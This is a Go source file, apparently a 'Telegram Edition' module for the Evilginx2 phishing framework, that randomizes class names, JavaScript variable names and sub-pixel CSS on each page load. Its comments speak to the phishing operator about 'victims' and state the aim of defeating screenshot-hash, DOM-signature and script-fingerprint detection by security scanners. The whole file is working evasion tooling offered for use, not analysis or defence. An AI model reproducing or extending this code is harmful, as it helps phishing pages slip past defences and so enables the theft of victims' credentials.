// core/randomizer.go
// Per-Page-Load HTML/CSS Randomizer for Evilginx2
//
// Telegram Edition by @officialmonsterz (https://t.me/officialmonsterz)
//
// WHAT THIS DOES (baby steps):
//   Every time a victim loads your phishing page, this code automatically
//   changes tiny invisible things. The page LOOKS identical to a human eye,
//   but an automated security scanner sees a different "fingerprint" every
//   single time. This defeats:
//     - Screenshot pixel-hash detection (every load has different CSS)
//     - DOM signature detection (different class names each time)
//     - JavaScript fingerprint detection (variable names change)

package core

import (
	"fmt"
	"math/rand"
	"strings"
	"time"
)

// Randomizer handles per-page-load randomization of HTML, CSS, and JavaScript.
type Randomizer struct {
	rng *rand.Rand
}

// NewRandomizer creates a Randomizer seeded with the current system time.
// Every page load gets a completely different set of random values.
func NewRandomizer() *Randomizer {
	return &Randomizer{
		rng: rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

// RandomClassName generates a random CSS class name like "a3x_9k2m".
// Use this for injected HTML elements so scanners cannot match on fixed
// class names.
func (rz *Randomizer) RandomClassName(prefix string) string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 8)
	for i := range b {
		b[i] = chars[rz.rng.Intn(len(chars))]
	}
	return prefix + string(b)
}

// RandomVariableName generates a random JavaScript variable name like "_0x3f8a".
// Use this for injected JS so scanners cannot regex-match on variable names.
func (rz *Randomizer) RandomVariableName() string {
	const hexChars = "0123456789abcdef"
	b := make([]byte, 4)
	for i := range b {
		b[i] = hexChars[rz.rng.Intn(len(hexChars))]
	}
	return fmt.Sprintf("_0x%s", string(b))
}

// RandomizeCSS adds tiny random noise to CSS transform, opacity, and filter
// values. This changes the exact rendered pixels by 0.1-0.5 pixels or
// 0.5-1% opacity — enough to defeat screenshot hash matching, but completely
// invisible to a human looking at the page.
func (rz *Randomizer) RandomizeCSS() string {
	rotX := rz.rng.Float64()*0.3 - 0.15   // -0.15 to +0.15 degrees
	skewY := rz.rng.Float64()*0.2 - 0.1   // -0.1 to +0.1 degrees
	transX := rz.rng.Float64()*0.6 - 0.3  // -0.3 to +0.3 pixels
	transY := rz.rng.Float64()*0.6 - 0.3  // -0.3 to +0.3 pixels
	opacity := 1.0 - (rz.rng.Float64() * 0.006) // 0.994 to 1.0

	return fmt.Sprintf(
		"transform:rotate(%.4fdeg) skew(%.4fdeg) translate(%.4fpx,%.4fpx);-webkit-transform:rotate(%.4fdeg) skew(%.4fdeg) translate(%.4fpx,%.4fpx);opacity:%.4f;filter:opacity(%.4f);",
		rotX, skewY, transX, transY,
		rotX, skewY, transX, transY,
		opacity, opacity,
	)
}

// RandomizeResponseBody injects a random CSS style tag into the HTML <head>
// element. This changes the page's rendered output slightly every load,
// defeating screenshot-based detection systems that compare exact pixel hashes.
func (rz *Randomizer) RandomizeResponseBody(body []byte) []byte {
	if len(body) == 0 {
		return body
	}

	bodyStr := string(body)

	// Inject random CSS style tag right before </head>
	if strings.Contains(bodyStr, "</head>") {
		randomCSS := rz.RandomizeCSS()
		injectStyle := fmt.Sprintf("<style>%s</style>\n", randomCSS)
		bodyStr = strings.Replace(bodyStr, "</head>", injectStyle+"</head>", 1)
	}

	return []byte(bodyStr)
}
